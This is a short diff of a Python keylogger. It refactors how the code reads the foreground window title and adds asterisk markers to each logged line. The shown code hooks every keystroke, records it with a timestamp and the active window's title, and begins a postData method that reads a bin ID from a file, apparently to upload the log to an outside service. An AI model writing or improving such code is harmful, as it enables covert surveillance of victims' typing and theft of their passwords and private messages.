@@ -1,7 +1,7 @@
 import keyboard #keylogs
 from threading import Semaphore, Timer
 from datetime import datetime
-from win32 import win32gui
+from win32gui import GetWindowText, GetForegroundWindow
 import requests
 import os
 
@@ -16,14 +16,12 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        w=win32gui
-        w.GetWindowText (w.GetForegroundWindow())
-        window = (str(w.GetWindowText (w.GetForegroundWindow())))
+        window = GetWindowText(GetForegroundWindow())
         if len(name) > 1:
             name = name.replace(" ", "_")
             name = f"[{name.upper()}]"
         time = datetime.now()
-        self.log += ("\n" + time.strftime("%m/%d/%Y, %H:%M:%S") +"\t" + 'WINDOW: ' + window + "\t key: " + name )
+        self.log += ("\n" + "***" + time.strftime("%m/%d/%Y, %H:%M:%S") +"\t" + 'WINDOW: ' + window + "\t key: " + name + "***")
 
     def postData(self):
         bin_id = open('binID.txt', 'r').read()
